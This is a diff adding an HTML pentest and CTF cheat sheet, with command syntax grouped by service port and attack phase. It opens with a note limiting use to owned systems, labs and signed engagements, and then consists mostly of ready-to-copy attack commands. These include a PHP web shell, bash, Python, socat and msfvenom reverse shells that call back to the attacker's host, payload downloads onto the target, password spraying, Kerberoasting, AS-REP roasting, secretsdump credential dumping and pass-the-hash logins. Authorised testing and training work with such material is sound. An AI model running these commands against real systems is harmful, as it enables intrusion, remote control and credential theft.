@@ -1,0 +1,323 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cheat sheet</title>
+<meta name="description" content="A printable syntax cheat sheet for penetration testing and CTF work, grouped by port and by phase: scanning, per-service enumeration, reverse shells, TTY upgrades, file transfer, privilege escalation and password cracking.">
+<meta name="theme-color" content="#0f1319">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Cheat sheet - pentest toolkit">
+<meta property="og:description" content="Syntax quick reference grouped by port and by phase. Prints on a couple of pages.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2032%2032%22%3E%3Crect%20width%3D%2232%22%20height%3D%2232%22%20rx%3D%227%22%20fill%3D%22%230f1319%22%2F%3E%3Cpath%20d%3D%22M9%2011l5%205-5%205%22%20fill%3D%22none%22%20stroke%3D%22%232dd4bf%22%20stroke-width%3D%223%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%3Cpath%20d%3D%22M18%2021h6%22%20fill%3D%22none%22%20stroke%3D%22%232dd4bf%22%20stroke-width%3D%223%22%20stroke-linecap%3D%22round%22%2F%3E%3C%2Fsvg%3E">
+<style>
+:root{
+  --bg:#0f1319; --surface:#141a22; --elev:#1a212c; --line:#2a3342;
+  --ink:#e7ebf2; --muted:#8b95a7; --faint:#7c8798; --accent:#2dd4bf;
+  --mono:ui-monospace,"JetBrains Mono","Cascadia Code","IBM Plex Mono",Menlo,Consolas,monospace;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+*{box-sizing:border-box}
+html{scroll-padding-top:60px}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+  font-size:14px;line-height:1.6;-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+
+.topnav{display:flex;align-items:center;gap:2px;flex-wrap:wrap;padding:7px 20px;
+  background:var(--surface);border-bottom:1px solid var(--line);font-family:var(--mono);font-size:12px;
+  position:sticky;top:0;z-index:20}
+.topnav a{color:var(--muted);text-decoration:none;padding:4px 10px;border-radius:6px}
+.topnav a:hover{color:var(--ink);background:var(--elev)}
+.topnav a[aria-current="page"]{color:var(--ink);background:var(--elev)}
+.topnav .sep{flex:1}
+.topnav .ver{color:var(--faint);font-size:11px;padding-right:8px}
+.topnav button{font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--elev);
+  border:1px solid var(--line);border-radius:5px;padding:3px 9px;cursor:pointer}
+.topnav button:hover{color:var(--ink);border-color:var(--faint)}
+
+.layout{max-width:1180px;margin:0 auto;padding:22px 20px 110px;display:grid;
+  grid-template-columns:210px minmax(0,1fr);gap:34px;align-items:start}
+.toc{position:sticky;top:64px;font-family:var(--mono);font-size:12px;display:flex;
+  flex-direction:column;gap:1px;max-height:calc(100vh - 90px);overflow-y:auto}
+.toc a{color:var(--muted);text-decoration:none;padding:3px 8px;border-radius:5px;border-left:2px solid transparent}
+.toc a:hover{color:var(--ink);background:var(--surface)}
+.toc a.active{color:var(--ink);border-left-color:var(--accent);background:var(--surface)}
+
+article{min-width:0}
+h1{font-family:var(--mono);font-size:21px;margin:0 0 6px;letter-spacing:.3px}
+h2{font-family:var(--mono);font-size:15px;margin:34px 0 10px;color:var(--accent);
+  border-bottom:1px solid var(--line);padding-bottom:6px;scroll-margin-top:60px}
+h3{font-family:var(--mono);font-size:13px;margin:20px 0 6px;color:var(--ink)}
+p{color:var(--muted);max-width:78ch;margin:8px 0}
+p strong,li strong{color:var(--ink)}
+ol,ul{color:var(--muted);max-width:78ch;padding-left:22px}
+li{margin:4px 0}
+hr{border:0;border-top:1px solid var(--line);margin:26px 0}
+code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--elev);
+  border-radius:4px;padding:1px 5px}
+
+.block{position:relative;margin:10px 0}
+.block pre{background:var(--surface);border:1px solid var(--line);border-radius:8px;
+  padding:12px 14px;overflow-x:auto;margin:0}
+.block pre code{background:none;padding:0;font-size:12.5px;line-height:1.65;color:#d7e3f4;white-space:pre}
+.block .copy{position:absolute;top:7px;right:7px;font-family:var(--mono);font-size:11px;
+  color:var(--muted);background:var(--elev);border:1px solid var(--line);border-radius:5px;
+  padding:3px 9px;cursor:pointer;opacity:0;transition:opacity .12s}
+.block:hover .copy,.block .copy:focus-visible{opacity:1}
+.block .copy.ok{opacity:1;color:#0b0f14;background:#34d399;border-color:#34d399}
+
+@media (max-width:820px){
+  .layout{grid-template-columns:1fr;gap:16px}
+  .toc{position:static;max-height:none;flex-direction:row;flex-wrap:wrap;
+    border-bottom:1px solid var(--line);padding-bottom:10px}
+  .block .copy{opacity:1}
+}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+
+@media print{
+  .topnav,.toc,.block .copy{display:none!important}
+  body{background:#fff;color:#111;font-size:10.5pt}
+  .layout{display:block;max-width:none;padding:0}
+  a{color:#111;text-decoration:none}
+  h1{font-size:16pt}
+  h2{font-size:12pt;color:#111;border-bottom:1px solid #999;margin-top:16pt;break-after:avoid}
+  h3{font-size:10.5pt;break-after:avoid}
+  p,ol,ul,li{color:#222}
+  code{background:#f0f0f0;color:#111}
+  .block{break-inside:avoid;margin:6pt 0}
+  .block pre{background:#f6f6f6;border:1px solid #ccc;padding:6pt 8pt}
+  .block pre code{color:#111;white-space:pre-wrap}
+  hr{margin:10pt 0}
+}
+</style>
+</head>
+<body>
+
+<nav class="topnav" aria-label="Toolkit">
+  <a href="index.html">launcher</a>
+  <a href="playbook.html">playbook</a>
+  <a href="arsenal.html">arsenal</a>
+  <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
+  <span class="sep"></span>
+  <span class="ver">v1.1.0</span>
+  <button type="button" id="printBtn">print</button>
+</nav>
+
+<div class="layout">
+  <nav class="toc" id="toc" aria-label="Sections"><a href="#scope-and-tool-rules-read-this-first">Scope and tool rules (read this first)</a><a href="#port-scanning">Port scanning</a><a href="#ftp-21">FTP (21)</a><a href="#ssh-22">SSH (22)</a><a href="#smtp-25">SMTP (25)</a><a href="#dns-53">DNS (53)</a><a href="#web-80-443-8080">Web (80/443/8080/...)</a><a href="#smb-139-445">SMB (139/445)</a><a href="#snmp-161-udp">SNMP (161/udp)</a><a href="#ldap-389-636">LDAP (389/636)</a><a href="#databases">Databases</a><a href="#rdp-winrm">RDP / WinRM</a><a href="#active-directory-88-present-dc">Active Directory (88 present = DC)</a><a href="#reverse-shells">Reverse shells</a><a href="#upgrade-a-dumb-shell-to-a-full-tty">Upgrade a dumb shell to a full TTY</a><a href="#file-transfer">File transfer</a><a href="#privilege-escalation-first-moves">Privilege escalation, first moves</a><a href="#password-cracking">Password cracking</a><a href="#searchsploit">searchsploit</a><a href="#the-loop-to-run-on-every-box">The loop to run on every box</a></nav>
+  <article id="doc">
+<h1 id="pentest-syntax-cheat-sheet">Pentest syntax cheat sheet</h1>
+<p>Placeholders: <code>&lt;ip&gt;</code> target, <code>&lt;host&gt;</code> hostname/FQDN, <code>&lt;user&gt;</code> <code>&lt;pass&gt;</code> creds, <code>&lt;domain&gt;</code> AD domain, <code>&lt;lhost&gt;</code> your VPN IP, <code>&lt;lport&gt;</code> your listener port.</p>
+<p>Set these once per box and reuse:</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>export IP=10.10.10.10
+export LHOST=$(ip -4 addr show tun0 | grep -oP &#x27;inet \K[\d.]+&#x27;)   # your VPN IP
+export LPORT=443</code></pre></div>
+<hr>
+<h2 id="scope-and-tool-rules-read-this-first">Scope and tool rules (read this first)</h2>
+<p>Run this against systems you own, a lab or CTF you are registered with, or an engagement with a signed scope. Nothing else.</p>
+<p><strong>On a certification exam</strong> the tooling is usually restricted, and the OSCP rules are the strictest you are likely to meet:</p>
+<p>Allowed: manual tools, nmap, targeted nmap scripts, one-off exploits, <code>netexec</code>, impacket, evil-winrm, Burp community, linpeas/winpeas, targeted Metasploit <strong>on a single machine only</strong>.</p>
+<p>Not allowed: <code>sqlmap</code>, automated exploitation (db_autopwn, browser_autopwn), mass vulnerability scanners (Nessus, OpenVAS; Nikto is fine as it is not an exploit scanner but treat with care), and Metasploit auto-exploit beyond your one permitted box. When in doubt, do it by hand.</p>
+<p>On a CTF or your own lab none of that applies — but working by hand is still how you learn what the automated tool was doing.</p>
+<hr>
+<h2 id="port-scanning">Port scanning</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># Fast full TCP sweep, then version + default scripts on what is open
+nmap -p- --min-rate 10000 -T4 -Pn $IP -oN allports.nmap
+ports=$(grep -oP &#x27;^\d+(?=/tcp)&#x27; allports.nmap | paste -sd, -)
+nmap -sCV -p$ports -Pn $IP -oN detailed.nmap
+
+# UDP (slow, top ports only)
+sudo nmap -sU --top-ports 100 -T4 $IP -oN udp.nmap
+
+# rustscan alternative (faster discovery)
+rustscan -a $IP -- -sCV</code></pre></div>
+<hr>
+<h2 id="ftp-21">FTP (21)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nmap -p21 --script ftp-anon,ftp-syst $IP
+ftp $IP                       # user: anonymous  pass: anything
+# inside ftp:  binary   |   prompt off   |   mget *   |   put &lt;file&gt;
+wget -r ftp://anonymous:anon@$IP/     # pull everything</code></pre></div>
+<h2 id="ssh-22">SSH (22)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nmap -p22 --script ssh-auth-methods,ssh2-enum-algos $IP
+ssh &lt;user&gt;@$IP
+ssh -i id_rsa &lt;user&gt;@$IP      # with a found key (chmod 600 id_rsa first)
+ssh2john id_rsa &gt; hash        # crack an encrypted key</code></pre></div>
+<h2 id="smtp-25">SMTP (25)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nmap -p25 --script smtp-commands,smtp-enum-users $IP
+smtp-user-enum -M VRFY -U users.txt -t $IP</code></pre></div>
+<h2 id="dns-53">DNS (53)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>dig axfr @$IP &lt;domain&gt;        # zone transfer
+dnsrecon -d &lt;domain&gt; -n $IP
+nslookup                      # then: server $IP  -&gt;  &lt;domain&gt;</code></pre></div>
+<h2 id="web-80-443-8080">Web (80/443/8080/...)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>whatweb -a3 http://$IP
+curl -sSik http://$IP/robots.txt
+nmap -p80 --script http-enum,http-title,http-headers,http-methods $IP
+
+# directory brute (pick one). -d 2 stops ferox recursing into a phone book
+feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -x php,html,txt -C 404,403
+ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404
+gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+
+# vhost / subdomain fuzz (add &lt;host&gt; to /etc/hosts first)
+ffuf -u http://$IP -H &quot;Host: FUZZ.&lt;host&gt;&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs &lt;baseline-size&gt;
+
+# WordPress
+curl -s http://$IP/readme.html | grep -i version                 # core version
+wpscan --url http://$IP --enumerate ap,at,u,cb,dbe --plugins-detection aggressive --api-token &lt;token&gt;
+cmsmap -f W http://$IP                                            # alt scanner (also J/D/M); -F full, noisy
+curl -s http://$IP/wp-json/wp/v2/users                           # user enum via REST API
+wpscan --url http://$IP -U &lt;user&gt; -P /usr/share/wordlists/rockyou.txt   # login brute
+# admin panel -&gt; Appearance &gt; Theme Editor &gt; 404.php = PHP shell ; wp-config.php holds the DB creds
+
+# PHP shells to upload
+echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; cmd.php          # then browse cmd.php?cmd=id
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # edit $ip/$port, upload, nc -lvnp &lt;port&gt;, browse it
+msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php</code></pre></div>
+<p>Reminder: if the browser redirects to a name, <code>echo "$IP &lt;host&gt;" | sudo tee -a /etc/hosts</code>.</p>
+<h2 id="smb-139-445">SMB (139/445)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nxc smb $IP                                   # OS / domain / signing
+nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27; --shares              # null session
+nxc smb $IP -u guest -p &#x27;&#x27; --shares
+nxc smb $IP -u &lt;user&gt; -p &lt;pass&gt; --shares
+enum4linux-ng -A $IP
+smbmap -H $IP -u guest -p &#x27;&#x27;
+smbclient -L //$IP/ -N                         # list shares
+smbclient //$IP/&lt;share&gt; -N                     # connect (or -U &#x27;&lt;user&gt;%&lt;pass&gt;&#x27;)
+smbclient //$IP/&lt;share&gt; -N -c &#x27;recurse ON; ls&#x27; # walk a share
+
+# password spray / cred check across a subnet
+nxc smb $IP -u users.txt -p &#x27;Password1&#x27; --continue-on-success</code></pre></div>
+<h2 id="snmp-161-udp">SNMP (161/udp)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
+snmpwalk -v2c -c public $IP
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2   # running processes</code></pre></div>
+<h2 id="ldap-389-636">LDAP (389/636)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nmap -p389 --script ldap-rootdse $IP
+ldapsearch -x -H ldap://$IP -s base -b &#x27;&#x27; namingContexts
+ldapsearch -x -H ldap://$IP -b &#x27;&lt;baseDN&gt;&#x27; &gt; ldap_dump.txt</code></pre></div>
+<h2 id="databases">Databases</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># MSSQL 1433
+impacket-mssqlclient &lt;user&gt;:&lt;pass&gt;@$IP            # add -windows-auth for domain
+# MySQL 3306
+mysql -h $IP -u root -p
+# PostgreSQL 5432
+psql -h $IP -U postgres
+# Redis 6379
+redis-cli -h $IP        # then: info | keys * | config get dir</code></pre></div>
+<h2 id="rdp-winrm">RDP / WinRM</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>xfreerdp /v:$IP /u:&lt;user&gt; /p:&lt;pass&gt; +clipboard /dynamic-resolution
+nxc winrm $IP -u &lt;user&gt; -p &lt;pass&gt;
+evil-winrm -i $IP -u &lt;user&gt; -p &lt;pass&gt;
+evil-winrm -i $IP -u &lt;user&gt; -H &lt;ntlm-hash&gt;       # pass-the-hash</code></pre></div>
+<h2 id="active-directory-88-present-dc">Active Directory (88 present = DC)</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>kerbrute userenum -d &lt;domain&gt; --dc $IP users.txt
+impacket-GetNPUsers &lt;domain&gt;/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
+impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip $IP -request               # Kerberoast
+impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@$IP
+bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; -ns $IP -c all</code></pre></div>
+<hr>
+<h2 id="reverse-shells">Reverse shells</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># listener
+nc -lvnp $LPORT
+rlwrap nc -lvnp $LPORT     # nicer, with history/arrows
+
+# bash
+bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&#x27;$LHOST&#x27;/&#x27;$LPORT&#x27; 0&gt;&amp;1&#x27;
+# python
+python3 -c &#x27;import socket,os,pty;s=socket.socket();s.connect((&quot;&#x27;$LHOST&#x27;&quot;,&#x27;$LPORT&#x27;));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre></div>
+<p>Best source for one-liners in a pinch: revshells.com (run it locally, or just remember the site).</p>
+<h2 id="upgrade-a-dumb-shell-to-a-full-tty">Upgrade a dumb shell to a full TTY</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># 1. ON TARGET: spawn a PTY  (no python3? use:  script -qc /bin/bash /dev/null)
+python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+# 2. press Ctrl-Z  -&gt; drops you to your own Kali prompt
+
+# 3. ON KALI. Paste both lines together. Screen goes blank/no-echo, that&#x27;s normal, press Enter
+stty raw -echo
+fg
+
+# 4. ON TARGET: fix the environment
+export TERM=xterm
+export SHELL=/bin/bash
+
+# 5. size it: run &#x27;stty size&#x27; in a spare Kali tab to get &#x27;rows cols&#x27;, then ON TARGET:
+stty rows 38 cols 190
+
+# terminal wrecked? on Kali:  reset    (or)  stty sane
+# cleanest if target has socat (perfect TTY, no stty dance):
+#   kali:   socat file:$(tty),raw,echo=0 tcp-listen:4444
+#   target: socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:&lt;LHOST&gt;:4444</code></pre></div>
+<h2 id="file-transfer">File transfer</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># on your box: serve the folder
+python3 -m http.server 80
+# on target (Linux)
+wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
+curl http://$LHOST/x -o /tmp/x
+# on target (Windows)
+certutil -urlcache -f http://$LHOST/nc.exe nc.exe
+powershell -c &quot;iwr http://$LHOST/x.exe -o x.exe&quot;
+# via SMB (Windows pull)
+impacket-smbserver share . -smb2support     # your box
+copy \\$LHOST\share\file.exe                 # target</code></pre></div>
+<h2 id="privilege-escalation-first-moves">Privilege escalation, first moves</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># Linux
+./linpeas.sh | tee linpeas.txt
+sudo -l
+find / -perm -4000 -type f 2&gt;/dev/null       # SUID
+getcap -r / 2&gt;/dev/null                       # capabilities
+crontab -l; cat /etc/crontab
+# check GTFOBins for anything you find in sudo -l or SUID
+
+# Windows
+.\winpeas.exe
+whoami /priv                                  # look for SeImpersonate -&gt; potato
+systeminfo                                    # then windows-exploit-suggester</code></pre></div>
+<h2 id="password-cracking">Password cracking</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>hashcat -m &lt;mode&gt; hash.txt /usr/share/wordlists/rockyou.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+# common modes: 0 md5, 1000 ntlm, 1800 sha512crypt, 13100 kerberoast TGS
+hashcat --example-hashes | grep -i &lt;type&gt;      # find the right mode</code></pre></div>
+<h2 id="searchsploit">searchsploit</h2>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>searchsploit &lt;product&gt; &lt;version&gt;
+searchsploit -m &lt;id&gt;          # copy exploit to cwd
+searchsploit -x &lt;id&gt;          # view it</code></pre></div>
+<hr>
+<h2 id="the-loop-to-run-on-every-box">The loop to run on every box</h2>
+<ol><li>Full TCP scan, then <code>-sCV</code> on the open ports.</li><li>For each service, enumerate it fully before moving on. Do not tunnel-vision on port 80.</li><li>Note every version string and <code>searchsploit</code> it.</li><li>Add hostnames to <code>/etc/hosts</code> the moment you see one.</li><li>Get any foothold, upgrade the shell, run peas, check <code>sudo -l</code>.</li><li>Keep notes as you go. Screenshot proof.txt with <code>type</code>/<code>cat</code> plus <code>whoami</code> and <code>ip</code>.</li></ol>
+  </article>
+</div>
+
+<script>
+(function(){
+  document.getElementById("printBtn").addEventListener("click",function(){window.print();});
+
+  document.getElementById("doc").addEventListener("click",async function(e){
+    var btn=e.target.closest(".copy");
+    if(!btn)return;
+    var code=btn.parentElement.querySelector("code").textContent;
+    try{await navigator.clipboard.writeText(code);}
+    catch(_){var t=document.createElement("textarea");t.value=code;
+      document.body.appendChild(t);t.select();document.execCommand("copy");t.remove();}
+    var old=btn.textContent;btn.textContent="copied";btn.classList.add("ok");
+    setTimeout(function(){btn.textContent=old;btn.classList.remove("ok");},1100);
+  });
+
+  // highlight the section you are reading
+  var links=Array.prototype.slice.call(document.querySelectorAll(".toc a"));
+  var heads=links.map(function(a){return document.getElementById(a.getAttribute("href").slice(1));})
+                 .filter(Boolean);
+  if("IntersectionObserver" in window && heads.length){
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(!en.isIntersecting)return;
+        links.forEach(function(a){a.classList.toggle("active",a.getAttribute("href")==="#"+en.target.id);});
+      });
+    },{rootMargin:"-60px 0px -75% 0px"});
+    heads.forEach(function(h){io.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
